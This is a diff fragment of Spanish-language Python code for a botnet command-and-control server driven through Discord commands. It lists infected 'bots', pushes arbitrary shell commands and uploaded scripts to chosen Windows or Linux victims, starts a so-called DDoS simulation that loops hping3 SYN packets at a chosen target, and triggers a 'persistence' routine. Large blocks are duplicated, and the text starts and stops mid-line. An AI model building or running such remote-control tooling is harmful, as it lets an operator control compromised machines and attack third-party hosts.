lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un bot específico.\r\n-    - Ejemplo: `!cerrar_conexion 1`\r\n-\r\n-    **!menu_comandos**\r\n-    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n-\r\n-    **!ayuda**\r\n-    - Muestra este mensaje de ayuda.\r\n-    \"\"\"\r\n-    await ctx.send(help_text)\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot específico\")\r\n-        print(\"5. Lista de bots específicos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opción: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no válido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inválido. Debe ingresar un número.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opción no válida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[→] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un bot específico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y envía el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexión del bot si ocurre durante la comunicación.\r\n-\r\n-    :param bot: El socket del bot al que se enviará el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots(bot_id):\r\n-    \"\"\"\r\n-    Cierra la conexión con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n-    los bots conectados.\r\n-    \r\n-    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n-    :type bot_id: int\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot:  # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close()  # Cerrar la conexión\r\n-            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot)  # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot]  # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot]  # Eliminar el SO del bot\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-import socket\r\n-import subprocess\r\n-import threading\r\n-import time\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-# Variables globales\r\n-bots = []  # Lista de bots conectados\r\n-bot_ids = {}  # Diccionario con los IDs de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un bot específico.\r\n-    - Ejemplo: `!cerrar_conexion 1`\r\n-\r\n-    **!menu_comandos**\r\n-    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n-\r\n-    **!ayuda**\r\n-    - Muestra este mensaje de ayuda.\r\n-    \"\"\"\r\n-    await ctx.send(help_text)\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot específico\")\r\n-        print(\"5. Lista de bots específicos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opción: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no válido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inválido. Debe ingresar un número.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opción no válida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[→] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un bot específico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y envía el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexión del bot si ocurre durante la comunicación.\r\n-\r\n-    :param bot: El socket del bot al que se enviará el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in 